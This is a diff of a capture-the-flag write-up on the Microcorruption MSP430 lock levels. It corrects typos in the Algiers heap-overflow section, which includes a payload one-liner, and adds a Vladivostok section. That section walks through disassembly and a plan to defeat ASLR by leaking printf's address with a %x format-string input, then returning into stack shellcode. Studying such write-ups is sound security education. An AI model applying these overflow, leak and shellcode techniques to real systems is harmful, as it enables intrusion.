@@ -75,7 +75,7 @@ $ python2 -c "print 'c844' + '41'*127 + '256e'" | xclip -i
 
 Level 13: Algiers
 -----------------
-This is probably my favourite level. In this level we enter a username and a password which are stored in the heap and not copied to the stack as in previous levels. The memory layout of the LockIT Pro is very much like that of the x86, with the heap growing towards higher memory addresses and the stack growing towards lower memory addresses.
+This is probably my favorite level. In this level we enter a username and a password which are stored in the heap and not copied to the stack as in previous levels. The memory layout of the LockIT Pro is very much like that of the x86, with the heap growing towards higher memory addresses and the stack growing towards lower memory addresses.
 ```
 Memory layout:
 ----------
@@ -89,7 +89,7 @@ Memory layout:
 
 Although the HSM 1 is employed in this level with the `unlock_door` subroutine present, it is not possible to simply overwrite the return address and jump there, as no user entered data is copied to the stack. Starting with the `login` subroutine we see the following:
 
-Two `0x10` bytes chunks are allocated on the heap and their respective addresses stored in registeres `r10` and `r11`.
+Two `0x10` bytes chunks are allocated on the heap and their respective addresses stored in registers `r10` and `r11`.
 ```
 463e:  3f40 1000      mov   #0x10, r15
 4642:  b012 6444      call  #0x4464 <malloc>
@@ -164,7 +164,7 @@ The `malloc` subroutine is not very useful to us, as it only writes to the heap 
 r15 stores the address of the payload to free.
 4508 <free>
 4508:  0b12           push  r11
-450a:  3f50 faff      add   #0xfffa, r15    // substract 0x6 to get the address of the allocation metadata.
+450a:  3f50 faff      add   #0xfffa, r15    // subtract 0x6 to get the address of the allocation metadata.
 450e:  1d4f 0400      mov   0x4(r15), r13   // r13 stores size and allocation status.
 4512:  3df0 feff      and   #0xfffe, r13    // set chunk as free
 4516:  8f4d 0400      mov   r13, 0x4(r15)   // and write back to memory.
@@ -213,3 +213,85 @@ Keeping in mind that we can overwrite the metadata of a chunk by overflowing the
 ```
 $ python2 -c "print '41'*16 + '9643' + '0044' + '1e01'" | xclip -i
 ```
+Level 14: Vladivostok
+---------------------
+
+Up until now, whenever we wanted to change the order of execution we knew in advance the address we wanted to get to (usually that of the `unlock_door` subroutine). However, in this level [ASLR](http://en.wikipedia.org/wiki/Address_space_layout_randomization) is introduced. As the name suggests, ASLR randomly arranges the address space before each execution, thereby hindering our ability to jump to a particular memory location. To understand this better lets breakdown the `main` subroutine.
+
+First, the `rand` subroutine is called twice to generate two random values stored in `r11` and `r10`.
+```
+4438 <main>
+4438:  b012 1c4a      call  #0x4a1c <rand>
+443c:  0b4f           mov   r15, r11
+443e:  3bf0 fe7f      and   #0x7ffe, r11
+4442:  3b50 0060      add   #0x6000, r11
+4446:  b012 1c4a      call  #0x4a1c <rand>
+444a:  0a4f           mov   r15, r10
+```
+Next, using `memcpy` the program code it copied over to the random location pointed to by `r11`.
+```
+444c:  3012 0010      push  #0x1000
+4450:  3012 0044      push  #0x4400 <__init_stack>
+4454:  0b12           push  r11
+4456:  b012 e849      call  #0x49e8 <_memcpy>
+```
+Leaving the stack in its original location isn't very smart, so it's setup in a new memory location using the second random value stored in 'r10':
+```
+445a:  3150 0600      add   #0x6, sp
+445e:  0f4a           mov   r10, r15
+4460:  3ff0 fe0f      and   #0xffe, r15
+4464:  0e4b           mov   r11, r14
+4466:  0e8f           sub   r15, r14
+4468:  3e50 00ff      add   #0xff00, r14
+...
+4472:  014e           mov   r14, sp
+```
+
+Finally, the program calls the `aslr_main` subroutine located in its new random memory location.
+```
+446c:  0d4b           mov   r11, r13
+446e:  3d50 5c03      add   #0x35c, r13
+...
+4474:  0f4b           mov   r11, r15
+4476:  8d12           call  r13
+```
+Since the whole program is copied over to a new memory location, I wrote a little script that given the original code and the ASLR offset (stored in `r11`) outputs the code with the new addresses:
+
+{% gist 8c3d94e69cd5cf683f5c vladivostok.py %}
+
+Now, what the `aslr_main` subroutine does is merely call the `_aslr_main` subroutine, which is quite long. By means of dynamic analysis we see that this subroutine prompts for a username, prints it and then prompts for a password, which is passed to the HSM 2. Entering a long username does not reveal anything except for the fact that no more than 8 chars are printed. However, once we enter more than 8 chars as a password we get the following message:
+```
+insn address unaligned
+```
+Therefore, we conclude that the password is stored on the stack and that we can overwrite the return address! Further investigation reveals that username is printed using `printf` (as opposed to `puts`) and that `0x14` bytes are read from the user as a password:
+```
+45da:  3241           pop   sr
+45dc:  3152           add   #0x8, sp
+45de:  c24e 2e24      mov.b r14, &0x242e    // makes sure no more than 8 bytes are printed.
+45e2:  0b12           push  r11
+45e4:  8c12           call  r12     // r12 stores the address of printf.
+...
+4684:  3241           pop   sr
+4686:  3152           add   #0x8, sp
+4688:  0b41           mov   sp, r11
+468a:  2b52           add   #0x4, r11
+468c:  3c40 1400      mov   #0x14, r12  // read up to 0x14 bytes.
+4690:  2d43           mov   #0x2, r13   // according to the LockIT manual 0x2 is the interrupt for gets.
+4692:  0c12           push  r12
+4694:  0b12           push  r11
+4696:  0d12           push  r13
+4698:  0012           push  pc
+469a:  0212           push  sr
+469c:  0f4d           mov   r13, r15
+469e:  8f10           swpb  r15
+46a0:  024f           mov   r15, sr
+46a2:  32d0 0080      bis   #0x8000, sr
+46a6:  b012 1000      call  #0x10
+```
+Since the HSM 2 is used we don't have any `unlock_door` subroutine to return to (even if there was, we don't know its address due to ASLR) and we also can't use the previously discussed format string vulnerabilities, as we don't know where the argument we want to change is stored. Thus, our only option it to write a [shellcode](http://en.wikipedia.org/wiki/Shellcode) to the stack, that will pass the `INT` subroutine `0x7f` (trigger unlock) as an argument. However, pointing the PC to its location a problem, as we don't know where the stack is located.
+
+Although it's not possible to use the `%n` specifier to do anything useful, we can still exploit the `printf` subroutine by passing it the `%x` specifier that will print the values found on the stack. Entering `%x%x` we get the following output (it depends on the first value produced by `rand`): 
+```
+0000bcdc
+```
+Which is the address of `printf`! Knowing the the new address of `printf` and the program's structure we can easily overwrite the return address with that of our shellcode (also on the stack), which will trigger an unlock.
